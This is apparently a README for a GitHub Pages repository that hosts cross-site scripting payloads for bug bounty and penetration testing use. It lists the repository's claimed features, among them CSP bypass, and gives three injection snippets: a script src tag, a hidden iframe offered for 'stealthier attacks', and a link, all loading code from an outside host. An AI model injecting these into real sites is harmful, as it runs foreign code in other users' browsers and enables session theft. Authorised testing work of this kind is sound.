# XSS Payload Host (GitHub Pages)

This repository hosts XSS payloads via GitHub Pages. It is useful for security researchers, bug bounty hunters, or penetration testers to demonstrate and execute Cross-Site Scripting (XSS) payloads on vulnerable websites.

## Features

- Hosts external XSS scripts via GitHub Pages
- Bypasses CSP in some cases (depending on target site)
- Works with `<script src>`, `<iframe>`, and `<img>`-based injection
- Easy to use for PoC (Proof-of-Concept)

---

##  How to Use


Use this GitHub Pages setup to host my XSS payloads for testing real-world vulnerabilities during bug bounty hunting. When I find a vulnerable parameter or input field that allows HTML/JS injection, I inject a <script src> or <iframe> pointing to my hosted payload like

<script src="https://yogsec.github.io/xss-test/"></script>

Or, for stealthier attacks or to bypass certain restrictions, I use:

<iframe src="https://yogsec.github.io/xss-test/" style="display:none"></iframe>

Or

<a href="https://yogsec.github.io/xss-test/">Click Here</a>
